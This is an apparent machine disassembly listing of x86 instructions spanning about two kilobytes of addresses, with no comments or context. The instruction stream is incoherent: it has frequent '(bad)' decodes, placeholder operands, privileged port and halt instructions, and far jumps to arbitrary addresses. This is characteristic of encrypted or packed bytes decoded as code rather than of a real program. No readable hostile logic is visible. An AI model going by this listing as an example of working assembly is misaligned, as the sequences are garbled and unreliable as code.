  415e6a:	inc    edi
  415e6b:	sar    edi,1
  415e6d:	push   es
  415e6e:	sbb    al,0x44
  415e70:	jl     0x415e14
  415e72:	paddd  mm3,mm4
  415e75:	(bad)  
  415e76:	mov    dl,0x98
  415e78:	(bad)  
  415e79:	out    0x62,al
  415e7b:	sub    al,0x9a
  415e7d:	mov    esp,0xaab4d670
  415e82:	jno    0x415e32
  415e84:	out    dx,eax
  415e85:	fnsave [ecx-0x1358199d]
  415e8b:	mov    bl,0x14
  415e8d:	(bad)  
  415e8e:	repnz sbb ecx,DWORD PTR [eax+0x2c]
  415e92:	popf   
  415e93:	lds    ecx,FWORD PTR [eax]
  415e95:	in     al,dx
  415e96:	and    edx,esp
  415e98:	push   edi
  415e99:	inc    esp
  415e9a:	sbb    al,0xb0
  415e9c:	sbb    edi,DWORD PTR [ebx+0x1668af7e]
  415ea2:	pusha  
  415ea3:	mov    ecx,0xfd140c18
  415ea8:	fnstsw WORD PTR [edx]
  415eaa:	mov    ch,0xe6
  415eac:	sub    DWORD PTR [ecx],esi
  415eae:	push   edi
  415eaf:	stc    
  415eb0:	ret    
  415eb1:	(bad)
  415eb4:	std    
  415eb5:	fimul  WORD PTR [eax-0x56]
  415eb8:	adc    al,0xe1
  415eba:	mov    ch,0xe0
  415ebc:	lods   eax,DWORD PTR ds:[esi]
  415ebd:	xor    cl,dl
  415ebf:	loope  0x415e75
  415ec1:	stos   DWORD PTR es:[edi],eax
  415ec2:	in     al,0x11
  415ec4:	stos   DWORD PTR es:[edi],eax
  415ec5:	mov    eax,DWORD PTR [ebx+edi*4-0x7237eb7b]
  415ecc:	inc    ebx
  415ecd:	lods   al,BYTE PTR ds:[esi]
  415ece:	outs   dx,BYTE PTR ds:[esi]
  415ecf:	push   edx
  415ed0:	dec    ebx
  415ed1:	push   esp
  415ed2:	jae    0x415e6b
  415ed4:	add    DWORD PTR ds:0x854a434b,0x8d4a347b
  415ede:	dec    ecx
  415edf:	pop    esp
  415ee0:	jle    0x415f48
  415ee2:	mov    DWORD PTR ds:0x959afcdc,edi
  415ee8:	mov    al,ds:0xa52a5edc
  415eed:	into   
  415eee:	jb     0x415f59
  415ef0:	ja     0x415f01
  415ef2:	mov    ah,0xd6
  415ef4:	loope  0x415ed5
  415ef6:	xor    eax,DWORD PTR [ebx+esi*1+0x65531ffd]
  415efd:	in     al,0xb9
  415eff:	mov    al,0x9
  415f01:	cmp    al,0x65
  415f03:	add    ah,0x4c
  415f06:	shr    BYTE PTR [edi+eiz*4+0x474001b9],cl
  415f0d:	rcl    edi,cl
  415f0f:	fisttp WORD PTR [esi]
  415f11:	pop    ss
  415f12:	pop    esi
  415f13:	dec    esp
  415f14:	sti    
  415f15:	adc    DWORD PTR [ebx+0x1b],ebx
  415f18:	mov    eax,0x24444ccf
  415f1d:	cmp    cl,BYTE PTR [ebx+0x35]
  415f20:	adc    al,0x16
  415f22:	inc    ecx
  415f23:	inc    DWORD PTR [ebx+0x29164c33]
  415f29:	je     0x415efc
  415f2b:	sub    BYTE PTR [edx],dl
  415f2d:	mov    esp,cs
  415f2f:	mov    edi,0x451eda1
  415f34:	cdq    
  415f35:	adc    BYTE PTR [edx-0x63a99423],0xc1
  415f3c:	jns    0x415fb3
  415f3e:	inc    esp
  415f3f:	add    esi,DWORD PTR [ebx+ebx*2]
  415f42:	loop   0x415f95
  415f44:	jb     0x415ef0
  415f46:	add    dl,dl
  415f48:	cmp    bh,BYTE PTR [esi+0xb]
  415f4b:	mov    WORD PTR [ecx],?
  415f4d:	xlat   BYTE PTR ds:[ebx]
  415f4e:	enter  0xccdf,0x2f
  415f52:	dec    ebp
  415f53:	sbb    dh,ah
  415f55:	mov    ds:0xecae46ca,eax
  415f5a:	xchg   ecx,esi
  415f5c:	dec    edi
  415f5d:	dec    esp
  415f5e:	test   DWORD PTR [ebx-0x46a55c75],esp
  415f64:	push   ebp
  415f65:	(bad)  
  415f66:	stos   DWORD PTR es:[edi],eax
  415f67:	push   ds
  415f68:	mov    edi,0xd6df975e
  415f6d:	fisub  DWORD PTR [edx]
  415f6f:	pop    es
  415f70:	mov    eax,ds:0x2876409
  415f75:	mov    ds,WORD PTR [edi]
  415f77:	ins    DWORD PTR es:[edi],dx
  415f78:	mov    ecx,0xebbc3553
  415f7d:	pop    ecx
  415f7e:	js     0x415ff9
  415f80:	shl    BYTE PTR [ebp-0x66],1
  415f83:	sbb    al,0xa2
  415f85:	in     al,dx
  415f86:	and    bl,BYTE PTR [esi-0x4ad6e9e6]
  415f8c:	dec    ecx
  415f8d:	(bad)  
  415f8f:	lahf   
  415f90:	dec    esp
  415f91:	rcl    DWORD PTR [edx],cl
  415f93:	fidiv  WORD PTR [ebx]
  415f95:	mov    ebx,0x81b3dc88
  415f9a:	adc    al,0x42
  415f9c:	aam    0x81
  415f9e:	pop    eax
  415f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fa0:	push   eax
  415fa1:	cmp    BYTE PTR [esi-0x3],0x39
  415fa5:	mov    ds:0xce7206e6,al
  415faa:	jno    0x415fc3
  415fac:	jle    0x415f6b
  415fae:	loop   0x415f42
  415fb0:	popf   
  415fb1:	and    eax,DWORD PTR [esp+esi*2+0x79509fd7]
  415fb8:	cld    
  415fb9:	arpl   WORD PTR [esi+0x19e1c77e],ax
  415fbf:	cmp    DWORD PTR [eax-0x51],0x2c
  415fc3:	cmp    eax,0x31090cb
  415fc8:	push   ebx
  415fc9:	neg    ebx
  415fcb:	pop    eax
  415fcc:	test   BYTE PTR gs:[ebp+0x6f082a97],dl
  415fd3:	add    di,bp
  415fd6:	out    0x32,al
  415fd8:	adc    esi,ecx
  415fda:	sti    
  415fdb:	and    ch,BYTE PTR [esi]
  415fdd:	test   BYTE PTR [ebx-0x39e9e9ee],al
  415fe3:	sub    eax,0xcc8f325f
  415fe8:	pop    edx
  415fe9:	xor    BYTE PTR [ebp+0x73d77780],dh
  415fef:	out    0x91,eax
  415ff1:	or     BYTE PTR [ebx+eiz*1],bh
  415ff4:	pusha  
  415ff5:	sbb    BYTE PTR [edx-0x1e96ab6f],ah
  415ffb:	mov    dl,0xfe
  415ffd:	ret    0x1e17
  416000:	aad    0x2f
  416002:	sub    DWORD PTR [ecx+ecx*8+0x1111f530],ebx
  416009:	dec    esi
  41600a:	popf   
  41600b:	hlt    
  41600c:	xchg   edi,eax
  41600d:	jmp    0x416065
  41600f:	xor    DWORD PTR [edx],eax
  416011:	(bad)  
  416012:	fcmovnb st,st(5)
  416014:	(bad)  
  416015:	mov    ds:0x3cb28f98,al
  41601a:	repz xlat BYTE PTR ds:[ebx]
  41601c:	sub    ch,ah
  41601e:	or     BYTE PTR [ebx+eiz*4],dh
  416021:	push   ebp
  416022:	popf   
  416023:	mov    ebx,0x1aff13e
  416028:	cmp    al,al
  41602a:	xor    eax,0xc3956180
  41602f:	mov    BYTE PTR [eax],dl
  416031:	xor    BYTE PTR [esi+0x0],ch
  416034:	cld    
  416035:	and    al,0x3e
  416037:	test   DWORD PTR [esi+0x55],edi
  41603a:	adc    eax,0x25f862e5
  41603f:	xor    DWORD PTR ds:0xe1144add,esi
  416045:	jmp    0xd61ac41f
  41604a:	pop    eax
  41604b:	inc    ecx
  41604c:	lods   al,BYTE PTR ds:[esi]
  41604d:	fstp   st(5)
  41604f:	(bad)  
  416050:	cmp    DWORD PTR ds:0x702a686f,ecx
  416056:	or     edi,ebp
  416058:	and    eax,0xd179b01c
  41605d:	dec    esi
  41605e:	scas   eax,DWORD PTR es:[edi]
  41605f:	adc    al,0x69
  416061:	(bad)  
  416062:	imul   eax,DWORD PTR [ebx+0x34],0x42772544
  416069:	arpl   WORD PTR [edi+esi*1-0xb533e0f],bx
  416070:	js     0x41601f
  416072:	test   eax,0x70f36687
  416078:	icebp  
  416079:	push   0x507a81e4
  41607e:	pop    ss
  41607f:	pop    ecx
  416080:	jbe    0x416053
  416082:	sti    
  416083:	vfmsub132ss xmm5,xmm4,DWORD PTR [ebp+0x7f]
  416089:	stos   DWORD PTR es:[edi],eax
  41608a:	rol    bh,cl
  41608c:	xchg   ebx,eax
  41608d:	push   ds
  41608e:	mov    ebp,0xac33f2c9
  416093:	in     eax,0x6d
  416095:	mov    eax,0x7df4add9
  41609a:	push   eax
  41609b:	ror    esi,cl
  41609d:	mul    BYTE PTR [eax+eax*8-0x4d]
  4160a1:	arpl   WORD PTR [ebx-0x153c085c],di
  4160a7:	inc    ecx
  4160a8:	test   DWORD PTR [ebp-0x29],edx
  4160ab:	pop    es
  4160ac:	(bad)
  4160af:	mov    edi,0xbb731e1
  4160b4:	adc    al,BYTE PTR [ebp+0x56]
  4160b7:	popf   
  4160b8:	or     BYTE PTR [ebx],0xde
  4160bb:	jg     0x41604a
  4160bd:	sar    BYTE PTR [ebp+0xd],1
  4160c0:	and    DWORD PTR ds:0x16df280f,esi
  4160c6:	ds xchg ebp,eax
  4160c8:	inc    ebx
  4160c9:	xchg   esp,esi
  4160cb:	inc    eax
  4160cc:	outs   dx,DWORD PTR ds:[esi]
  4160cd:	push   ds
  4160ce:	xor    DWORD PTR [ebx+0x57],ecx
  4160d1:	sub    BYTE PTR [edi],bh
  4160d3:	retf   0x2277
  4160d6:	adc    bl,BYTE PTR [ebp+eax*2-0x43e2033e]
  4160dd:	mov    ds:0x279a3173,eax
  4160e2:	xchg   esp,eax
  4160e3:	and    BYTE PTR ds:0x4715d74c,al
  4160e9:	mov    esp,0x36b7b97c
  4160ee:	pop    esp
  4160ef:	xor    al,0x58
  4160f1:	cmp    al,0xf8
  4160f3:	xchg   ebp,eax
  4160f4:	outs   dx,DWORD PTR ds:[esi]
  4160f5:	aaa    
  4160f6:	adc    BYTE PTR [eax-0x79],0x6c
  4160fa:	mov    DWORD PTR [ebx-0x5b513a91],ebp
  416100:	call   0xbf18d92c
  416105:	dec    eax
  416106:	xchg   DWORD PTR [ebx-0x4940580c],eax
  41610c:	push   ecx
  41610d:	aad    0x75
  41610f:	pop    es
  416110:	or     eax,0x823bcbcd
  416115:	pop    ebx
  416116:	retf   
  416117:	aaa    
  416118:	jns    0x41610e
  41611a:	mov    esi,0xf77d264f
  41611f:	int3   
  416120:	jno    0x416153
  416122:	jg     0x41612b
  416124:	cmp    DWORD PTR [ebx],ebp
  416126:	mov    edx,0x21822fb4
  41612b:	dec    ebx
  41612c:	mov    dl,0xe2
  41612e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41612f:	xor    eax,0xa5460c52
  416134:	mov    esi,0xab043296
  416139:	pop    ss
  41613a:	mov    dh,0x3d
  41613c:	bound  esi,QWORD PTR [esi]
  41613e:	(bad)  
  41613f:	stos   DWORD PTR es:[edi],eax
  416140:	adc    BYTE PTR [eax-0x3c6f2aea],bl
  416146:	and    esp,DWORD PTR [eax]
  416148:	(bad)
  41614b:	push   0x22
  41614d:	fs dec eax
  41614f:	jg     0x4161cf
  416151:	mov    al,ds:0x93b97c70
  416156:	push   0x27
  416158:	in     eax,dx
  416159:	cli    
  41615a:	xchg   ecx,eax
  41615b:	push   esp
  41615c:	iret   
  41615d:	ins    BYTE PTR es:[edi],dx
  41615e:	int    0x61
  416160:	(bad)  
  416161:	or     al,bl
  416163:	and    al,0x5e
  416165:	out    0xb7,al
  416167:	add    DWORD PTR [eax],edi
  416169:	cmp    BYTE PTR [edx+0x7fd7d2f5],bh
  41616f:	pusha  
  416170:	sub    al,0xaa
  416172:	rol    BYTE PTR [edx+0xb70776b],0x63
  416179:	in     al,0xf9
  41617b:	fxch   st(3)
  41617d:	adc    BYTE PTR [ebp+0x7e1a8376],ch
  416183:	jmp    0x416142
  416185:	or     BYTE PTR [edi],ah
  416187:	(bad)  
  416188:	retf   
  416189:	inc    ebp
  41618a:	push   ebx
  41618b:	sub    edi,DWORD PTR [edx-0x6]
  41618e:	jno    0x4161d2
  416190:	(bad)  
  416191:	idiv   BYTE PTR cs:[ebp+0x0]
  416195:	icebp  
  416196:	fcmovnu st,st(3)
  416198:	cmp    BYTE PTR [esi-0x767f3a4d],ah
  41619e:	push   ss
  41619f:	sbb    eax,0xab9ebdc
  4161a4:	popf   
  4161a5:	data16 sbb ah,BYTE PTR [ebx+0x78]
  4161a9:	pop    esi
  4161aa:	and    al,0x95
  4161ac:	push   eax
  4161ad:	shr    DWORD PTR ds:0xd5b560a4,cl
  4161b3:	and    bh,BYTE PTR [edi]
  4161b5:	push   eax
  4161b6:	inc    esi
  4161b7:	loopne 0x4161c3
  4161b9:	imul   esp,DWORD PTR [ebx+ebx*4],0x4fb69b39
  4161c0:	add    esi,DWORD PTR [esi-0x7a916513]
  4161c6:	out    dx,al
  4161c7:	mov    esp,0x84ae275a
  4161cc:	xchg   ebp,eax
  4161cd:	ins    BYTE PTR es:[edi],dx
  4161ce:	mov    esp,0x13fe565e
  4161d3:	in     al,dx
  4161d4:	out    0xac,al
  4161d6:	out    0x98,eax
  4161d8:	adc    BYTE PTR [esi+eiz*2-0x4e711498],0x6a
  4161e0:	mov    ch,0x2e
  4161e3:	and    BYTE PTR [esi],dh
  4161e5:	xor    DWORD PTR [ebx-0x2fb1f3ab],esp
  4161eb:	pop    ebx
  4161ec:	jmp    0x981ed684
  4161f1:	sub    eax,0x6376696
  4161f6:	mov    eax,ds:0x438a8196
  4161fb:	test   bl,bl
  4161fd:	sub    BYTE PTR [ecx-0x3e],bl
  416200:	icebp  
  416201:	xor    al,0xe
  416203:	xor    ecx,ebx
  416205:	fdiv   DWORD PTR [edx+ebx*1-0x14]
  416209:	mov    al,0x47
  41620b:	fstp   DWORD PTR [esi+0x2e95e4be]
  416211:	or     al,0x25
  416213:	cs xchg esp,eax
  416215:	mov    ss,WORD PTR [ecx-0x2]
  416218:	mov    esi,0x608d013a
  41621d:	jle    0x416254
  41621f:	aam    0x16
  416221:	pushf  
  416222:	adc    eax,0x1eaa4170
  416227:	mov    al,ah
  416229:	jl     0x416271
  41622b:	mov    dl,0x3f
  41622d:	nop
  41622e:	and    bh,bl
  416230:	xor    DWORD PTR [esi],ecx
  416232:	push   ds
  416233:	xor    ebx,DWORD PTR [ebp+0x6bff23ff]
  416239:	lock add BYTE PTR [ebx],ch
  41623c:	xchg   ah,ch
  41623e:	lahf   
  41623f:	adc    dh,BYTE PTR ds:0xb9b8bab1
  416245:	xor    BYTE PTR [ecx],ah
  416247:	pop    es
  416248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416249:	or     ebx,DWORD PTR ds:0x42efd365
  41624f:	mov    bh,0x99
  416251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416252:	xchg   edi,eax
  416253:	inc    eax
  416254:	cmp    BYTE PTR [esi],ch
  416256:	push   ss
  416257:	xor    eax,0xb5268501
  41625c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625e:	mov    ds:0x98f316ae,eax
  416263:	stc    
  416264:	div    ah
  416266:	imul   BYTE PTR [eax-0x49]
  416269:	pop    ebx
  41626a:	aad    0x70
  41626c:	mov    bl,0xe8
  41626e:	xor    DWORD PTR [ebx-0x77570a94],ecx
  416274:	xlat   BYTE PTR ds:[ebx]
  416275:	push   ecx
  416276:	loope  0x4162a0
  416278:	cld    
  416279:	xor    BYTE PTR [ebp-0x60],0x6d
  41627d:	mov    edx,0xb753d444
  416282:	sub    bl,bh
  416284:	mov    esp,0xd5fbab28
  416289:	jecxz  0x416233
  41628b:	adc    ebx,DWORD PTR [eax-0x163cdfab]
  416291:	add    BYTE PTR [esi],ch
  416293:	lds    ebp,FWORD PTR [eax]
  416295:	je     0x416236
  416297:	push   cs
  416298:	dec    edx
  416299:	sbb    BYTE PTR [edi-0x35f46526],al
  41629f:	jmp    0xbc7e:0xb4b8bd26
  4162a6:	pop    eax
  4162a7:	mov    bh,0xb4
  4162a9:	leave  
  4162aa:	jae    0x4162a6
  4162ac:	jb     0x4162e9
  4162ae:	out    0x60,eax
  4162b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162b1:	jmp    0xf767:0x765f51af
  4162b8:	mov    esp,0x4ade006d
  4162bd:	xchg   esi,eax
  4162be:	mov    al,ds:0xabd8fd0d
  4162c3:	fst    QWORD PTR [ebp+0x2f]
  4162c6:	pop    edx
  4162c7:	retf   
  4162c8:	outs   dx,DWORD PTR ds:[esi]
  4162c9:	fdiv   st,st(7)
  4162cb:	ret    0x333d
  4162ce:	imul   esp,ecx,0xffffffbf
  4162d1:	test   BYTE PTR [edi],ch
  4162d3:	mov    ch,0x6a
  4162d5:	mov    ah,0x43
  4162d7:	and    bh,BYTE PTR [eax]
  4162d9:	jmp    0x41625f
  4162db:	arpl   WORD PTR [ebx+edi*4],cx
  4162de:	test   BYTE PTR [edi+0xd],bh
  4162e1:	test   eax,0x1625a5e5
  4162e6:	int3   
  4162e7:	mul    DWORD PTR [ebp-0x9]
  4162ea:	pop    edi
  4162eb:	mov    ebp,0xd827ddc3
  4162f0:	js     0x4162db
  4162f2:	sub    ah,BYTE PTR [esi]
  4162f4:	outs   dx,BYTE PTR ds:[esi]
  4162f5:	adc    ch,BYTE PTR [edx+0x1b9fb81b]
  4162fb:	mov    ch,0x69
  4162fd:	cmp    dl,BYTE PTR [ebx]
  4162ff:	push   ebp
  416300:	jno    0x4162b2
  416302:	push   ebx
  416303:	lea    eax,[ebx-0x61]
  416306:	lahf   
  416307:	ret    
  416308:	push   es
  416309:	inc    esi
  41630a:	cli    
  41630b:	dec    ebp
  41630c:	shl    BYTE PTR [esi+0xe240ea2],0x7f
  416313:	push   ecx
  416314:	(bad)  
  416315:	push   ebp
  416316:	rol    DWORD PTR [edx+0x69],1
  416319:	ins    BYTE PTR es:[edi],dx
  41631a:	std    
  41631b:	xor    BYTE PTR [ebx],al
  41631d:	(bad)  
  41631e:	in     eax,dx
  41631f:	das    
  416320:	aaa    
  416321:	js     0x416350
  416323:	dec    edx
  416324:	add    eax,0xff34a96a
  416329:	in     al,dx
  41632a:	gs inc ebp
  41632c:	mov    ah,0xdf
  41632e:	pop    esp
  41632f:	mov    edi,?
  416331:	loopne 0x41638c
  416333:	mov    ds:0x5184586a,al
  416338:	and    edx,DWORD PTR [esi-0x1e]
  41633b:	in     al,0xd5
  41633d:	dec    ecx
  41633e:	push   ecx
  41633f:	jmp    0x87294bf5
  416344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416345:	mov    DWORD PTR [ebx+0x11],edx
  416348:	push   ds
  416349:	cwde   
  41634a:	and    al,0xfe
  41634c:	sub    al,BYTE PTR [eax]
  41634e:	push   ebp
  41634f:	inc    ecx
  416350:	mov    esi,ss
  416352:	mov    ch,0xe5
  416354:	dec    esp
  416355:	clc    
  416356:	cmp    al,0xe
  416358:	or     BYTE PTR [edi],0xec
  41635b:	mov    BYTE PTR [ecx+0x63a52e59],cl
  416361:	sti    
  416362:	(bad)  
  416363:	jo     0x4163c6
  416365:	inc    ecx
  416366:	mov    edi,0x735714e2
  41636b:	or     cl,BYTE PTR [edi]
  41636d:	shl    BYTE PTR [edi+ebx*2-0x1638b68f],1
  416374:	pop    ecx
  416375:	cmp    al,0x56
  416377:	mov    esp,0x936477a2
  41637c:	outs   dx,DWORD PTR ds:[esi]
  41637d:	push   ecx
  41637e:	jge    0x4163bf
  416380:	mov    edx,0x9a2539f7
  416385:	neg    BYTE PTR [ebx]
  416387:	xchg   esi,eax
  416388:	lea    eax,[edx]
  41638a:	sub    eax,0x4fd27e83
  41638f:	in     al,dx
  416390:	push   edi
  416391:	push   edi
  416392:	retf   
  416393:	dec    eax
  416394:	retf   
  416395:	mov    ds:0x6cd136de,al
  41639a:	jns    0x41637e
  41639c:	pop    ebx
  41639d:	and    ch,bl
  41639f:	lods   al,BYTE PTR ds:[esi]
  4163a0:	fnstcw WORD PTR [esi-0x7119eccb]
  4163a6:	(bad)  
  4163a7:	jle    0x416376
  4163a9:	jmp    DWORD PTR [edx+ecx*1+0x30b24699]
  4163b0:	out    0x50,eax
  4163b2:	xchg   ecx,eax
  4163b3:	push   0xffffffb0
  4163b5:	leave  
  4163b6:	std    
  4163b7:	loopne 0x4163a8
  4163b9:	or     DWORD PTR [esi-0x39],eax
  4163bc:	test   al,0xbd
  4163be:	ins    BYTE PTR es:[edi],dx
  4163bf:	popa   
  4163c0:	clc    
  4163c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c2:	cwde   
  4163c3:	sub    edx,DWORD PTR [edi-0xc53f60a]
  4163c9:	mov    ch,0xaf
  4163cb:	ds cs push eax
  4163ce:	push   ecx
  4163cf:	jmp    0xd029ca66
  4163d4:	iret   
  4163d5:	jl     0x416438
  4163d7:	jle    0x4163a8
  4163d9:	adc    ch,BYTE PTR [ebp+eax*1-0x59]
  4163dd:	pop    esp
  4163de:	adc    BYTE PTR [edi-0x6f235b45],al
  4163e4:	pop    es
  4163e5:	scas   eax,DWORD PTR es:[edi]
  4163e6:	test   eax,0xff34a34a
  4163eb:	inc    esi
  4163ec:	and    BYTE PTR [esi+0x34],ch
  4163ef:	add    eax,0x6105f6a
  4163f4:	xor    ah,BYTE PTR [eax]
  4163f6:	xchg   esp,eax
  4163f7:	fld    st(6)
  4163f9:	and    BYTE PTR [edi-0x7a],al
  4163fc:	pop    ebp
  4163fd:	leave  
  4163fe:	rol    DWORD PTR [eax],1
  416400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416401:	lods   al,BYTE PTR ds:[esi]
  416402:	or     DWORD PTR ds:0x8646b3f5,ebx
  416408:	cmp    al,0x49
  41640a:	mov    ecx,fs
  41640c:	js     0x416461
  41640e:	stos   BYTE PTR es:[edi],al
  41640f:	sbb    bh,bl
  416411:	cld    
  416412:	mov    BYTE PTR [ecx],dh
  416414:	sbb    BYTE PTR [edi+0x7696511d],ch
  41641a:	jle    0x416447
  41641c:	xchg   esp,eax
  41641d:	(bad)  
  41641e:	outs   dx,DWORD PTR ds:[esi]
  41641f:	ja     0x416455
  416421:	sub    al,bh
  416423:	xor    al,0x46
  416425:	js     0x41647d
  416427:	sbb    bl,ch
  416429:	sub    BYTE PTR [ecx-0x5c],0x7b
  41642d:	cmc    
  41642e:	pop    ecx
  41642f:	aam    0x8a
  416431:	retf   0xa942
  416434:	adc    al,0x78
  416436:	xchg   ebp,eax
  416437:	push   edi
  416438:	in     al,dx
  416439:	mov    al,ds:0x498d6469
  41643e:	adc    al,0x9f
  416441:	jne    0x4163e0
  416443:	dec    ebp
  416444:	(bad)  
  416445:	fisttp DWORD PTR [edi-0x776806c9]
  41644b:	sbb    BYTE PTR [eax+0x1e],bl
  41644e:	cdq    
  41644f:	jne    0x416435
  416451:	outs   dx,BYTE PTR ds:[esi]
  416452:	jmp    0x41648f
  416454:	mov    ebx,0x9531d327
  416459:	pop    ebx
  41645a:	cmp    eax,0x16a249af
  41645f:	pop    esi
  416460:	adc    BYTE PTR [ecx+ebp*1+0x21],0xdc
  416465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416466:	xor    eax,0x1da70e76
  41646b:	and    esp,DWORD PTR [eax-0x46c6d327]
  416471:	mov    bl,0xa7
  416473:	fistp  WORD PTR [esi+ecx*4+0x4e]
  416477:	retf   0xa9ab
  41647a:	aad    0x8
  41647c:	fcmovnbe st,st(2)
  41647e:	add    esi,DWORD PTR ds:0x22983d6
  416484:	popf   
  416485:	aas    
  416486:	mov    ?,WORD PTR [eax+0x3641f1e9]
  41648c:	xlat   BYTE PTR ds:[ebx]
  41648d:	xor    edx,DWORD PTR [edx+0x19d581c7]
  416493:	test   al,0xae
  416495:	loopne 0x4164bc
  416497:	mov    al,ds:0xe8e85e5c
  41649c:	jp     0x416438
  41649e:	or     eax,0xbd32ac52
  4164a3:	ins    BYTE PTR es:[edi],dx
  4164a4:	cdq    
  4164a5:	outs   dx,BYTE PTR ds:[esi]
  4164a6:	rcl    DWORD PTR [eax+ecx*1-0x36],0xac
  4164ab:	add    edx,DWORD PTR [edi]
  4164ad:	adc    ah,BYTE PTR [edi]
  4164af:	cdq    
  4164b0:	jmp    0x1c85f2bf
  4164b5:	push   0x22
  4164b7:	int3   
  4164b8:	pop    ebp
  4164b9:	fild   WORD PTR [edx+0xd]
  4164bc:	sub    al,0x4f
  4164be:	dec    ebp
  4164bf:	loope  0x416524
  4164c1:	loope  0x416531
  4164c3:	or     ah,BYTE PTR [ecx-0x60]
  4164c6:	cld    
  4164c7:	int3   
  4164c8:	lds    esi,FWORD PTR [eax+0x145920ef]
  4164ce:	mov    al,ds:0x26630335
  4164d3:	sbb    edx,DWORD PTR [edx]
  4164d5:	mov    dl,0xb4
  4164d7:	not    DWORD PTR [edi-0x2b6d2ee0]
  4164dd:	mov    DWORD PTR [eax-0x57],esi
  4164e0:	lock jo 0x416506
  4164e3:	int    0xdb
  4164e5:	mov    ebp,eax
  4164e7:	cld    
  4164e8:	popa   
  4164e9:	xchg   edi,eax
  4164ea:	int3   
  4164eb:	out    dx,eax
  4164ec:	xchg   edi,eax
  4164ed:	mov    ds:0xb90827ac,al
  4164f2:	pop    es
  4164f3:	mov    ds:0xbaf5f4fb,al
  4164f8:	loope  0x4164bc
  4164fa:	arpl   ax,sp
  4164fc:	cmp    ebx,DWORD PTR [eax]
  4164fe:	inc    ebx
  4164ff:	mov    ds:0x9e08c332,eax
  416504:	dec    eax
  416505:	sbb    BYTE PTR [esi+0x4d596900],0x59
  41650c:	push   edi
  41650d:	(bad)
  416510:	les    edx,FWORD PTR [edi]
  416512:	pushf  
  416513:	outs   dx,BYTE PTR ds:[esi]
  416514:	test   edx,ebx
  416516:	mov    eax,0xc19320e5
  41651b:	cmp    BYTE PTR [esi],bl
  41651d:	xlat   BYTE PTR ds:[ebx]
  41651e:	push   edx
  41651f:	imul   esp,edi,0x2d0f50f1
  416525:	test   ch,ch
  416527:	inc    esp
  416528:	pop    esp
  416529:	pop    ds
  41652a:	push   es
  41652b:	add    al,0xd8
  41652d:	std    
  41652e:	cmp    al,BYTE PTR [eax]
  416530:	clc    
  416531:	add    eax,0x9fc427c7
  416536:	mov    ecx,0x2d69f1e1
  41653b:	addr16 jnp 0x4164f0
  41653e:	lock pop esi
  416540:	rcpps  xmm2,XMMWORD PTR [ebx+0x63]
  416544:	push   cs
  416545:	inc    ebx
  416546:	xchg   ebx,eax
  416547:	int3   
  416548:	shl    DWORD PTR [edx-0x2635303],0x46
  41654f:	pop    es
  416550:	sub    edx,DWORD PTR [edi]
  416552:	cmp    ch,BYTE PTR [ecx+ebx*8+0x1e]
  416556:	ins    BYTE PTR es:[edi],dx
  416557:	mov    ds:0xb7987fc4,al
  41655c:	add    dl,BYTE PTR [eax]
  41655e:	call   0x8d016f75
  416563:	in     eax,0xa7
  416565:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416567:	jae    0x416500
  416569:	or     al,BYTE PTR [ebx-0x58bf57]
  41656f:	dec    edi
  416570:	mov    bh,0xb8
  416572:	jns    0x41657e
  416574:	pop    ebx
  416575:	enter  0xb179,0x53
  416579:	cmp    al,0x19
  41657b:	lods   al,BYTE PTR ds:[esi]
  41657c:	int3   
  41657d:	daa    
  41657e:	loope  0x416512
  416580:	sbb    bl,BYTE PTR [esi-0x6139d150]
  416586:	jle    0x416578
  416588:	ret    0x8089
  41658b:	mov    dh,0xf7
  41658d:	cmp    BYTE PTR [edx+0x42d117f9],dh
  416593:	paddd  mm4,QWORD PTR [edi+0x6a]
  416597:	inc    esi
  416598:	rcl    ebp,0x2a
  41659b:	ins    DWORD PTR es:[edi],dx
  41659c:	sub    DWORD PTR ds:0x15e9c80c,esi
  4165a2:	mov    BYTE PTR [esi],al
  4165a4:	fst    QWORD PTR [edi-0x751c374]
  4165aa:	cmp    DWORD PTR [esi-0x56],edx
  4165ad:	mov    cl,0x1e
  4165af:	in     al,0x6d
  4165b1:	dec    esi
  4165b2:	or     bl,BYTE PTR [esi-0x2bb6e960]
  4165b8:	stc    
  4165b9:	adc    esp,DWORD PTR [ebx+ebx*1+0x0]
  4165bd:	mov    ebx,0xe06db7fe
  4165c2:	sbb    ch,BYTE PTR [edx+0x116e1447]
  4165c8:	pop    ebp
  4165c9:	or     DWORD PTR [ecx],ebx
  4165cb:	sbb    DWORD PTR ds:0xb6cd432f,edx
  4165d1:	xchg   esp,eax
  4165d2:	adc    BYTE PTR [ecx+ebx*1],dh
  4165d5:	pop    ss
  4165d6:	fdivrp st(3),st
  4165d8:	and    BYTE PTR [esi-0x2e],cl
  4165db:	inc    ebx
  4165dc:	sub    BYTE PTR [ebp-0x38df7c27],0x71
  4165e3:	pop    edi
  4165e4:	pop    ecx
  4165e5:	jae    0x41665a
  4165e7:	pop    ebx
  4165e8:	jp     0x4165ed
  4165ea:	fidivr WORD PTR [edx+0x2f]
  4165ed:	in     eax,0xb6
  4165ef:	ret    0x6898
  4165f2:	(bad)  
  4165f4:	and    ebx,DWORD PTR [ebx]
  4165f6:	imul   ebx,DWORD PTR [ebx-0x1f],0xd2d260d9
  4165fd:	wbinvd 
  4165ff:	mov    ch,0xa8
  416601:	test   bl,dl
  416603:	ror    BYTE PTR ds:[edi-0x7b6b43d0],cl
  41660a:	inc    ebp
  41660b:	or     esp,edx
  41660d:	or     eax,0xc53f1fde
  416612:	call   0x8d70c73
  416617:	dec    edx
  416618:	adc    DWORD PTR [eax],eax
  41661a:	xchg   esp,eax
  41661b:	into   
  41661c:	mov    edi,0xda3c36ed
  416621:	xor    eax,0xcf0c3976
  416626:	mov    ds:0x7b256de2,eax
  41662b:	je     0x416681
  41662d:	jnp    0x416693
  41662f:	xor    eax,DWORD PTR [ebx]
